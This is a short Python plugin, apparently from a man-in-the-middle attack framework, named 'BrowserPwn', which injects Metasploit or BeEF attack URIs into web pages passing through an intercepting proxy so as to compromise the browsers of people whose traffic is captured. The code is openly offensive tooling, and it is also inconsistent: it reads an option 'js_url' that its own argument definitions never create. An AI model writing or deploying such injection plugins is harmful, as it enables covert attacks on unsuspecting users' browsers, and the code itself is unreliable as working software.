import os,subprocess,logging,time
from plugins.Inject import Inject
from plugins.plugin import Plugin

class BrowserPwn(Inject,Plugin):
    name = "BrowserPwn"
    optname = "browserpwn"
    desc = "Easily attack browsers using MSF and/or BeEF.\nInherits from Inject."
    def initialize(self,options):
        '''Called if plugin is enabled, passed the options namespace'''
        Inject.initialize(self,options)
        self.html_src = options.msf_uri
        self.js_src = options.js_url
        self.rate_limit = 2
    def add_options(self,options):
        options.add_argument("--msf-uri",type=str,
            help="The attack URI given to you by MSF")
        options.add_argument("--beef-uri",type=str,
                help="The attack URI given to you by BeEF")
